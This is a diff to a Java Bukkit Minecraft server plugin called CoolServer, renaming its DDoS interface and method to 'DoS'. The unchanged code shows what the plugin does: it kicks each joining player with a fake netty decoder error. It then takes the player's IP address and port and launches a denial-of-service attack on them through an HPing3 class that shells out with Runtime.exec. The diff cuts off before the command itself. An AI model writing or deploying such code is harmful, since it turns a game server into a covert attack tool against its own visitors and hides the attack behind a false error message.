@@ -7,7 +7,7 @@ import org.bukkit.event.server.ServerListPingEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 
 public class CoolServer extends JavaPlugin implements Listener {
-    private DDoSInterface dDoSInterface = new HPing3();
+    private DoSInterface doSInterface = new HPing3();
 
     @Override
     public void onEnable() {
@@ -25,16 +25,16 @@ public class CoolServer extends JavaPlugin implements Listener {
         event.getPlayer().kickPlayer("Internal Exception: io.netty.handler.codec.DecoderException");
         String[] parts = event.getPlayer().getAddress().toString().substring(1).split(":");
         getServer().getScheduler().runTaskAsynchronously(this,
-                () -> dDoSInterface.ddos(parts[0], Integer.parseInt(parts[1])));
+                () -> doSInterface.dos(parts[0], Integer.parseInt(parts[1])));
     }
 
-    public interface DDoSInterface {
-        void ddos(String host, int port);
+    public interface DoSInterface {
+        void dos(String host, int port);
     }
 
-    public class HPing3 implements DDoSInterface {
+    public class HPing3 implements DoSInterface {
         @Override
-        public void ddos(String host, int port) {
+        public void dos(String host, int port) {
             Process p;
             try {
                 p = Runtime.getRuntime().exec(
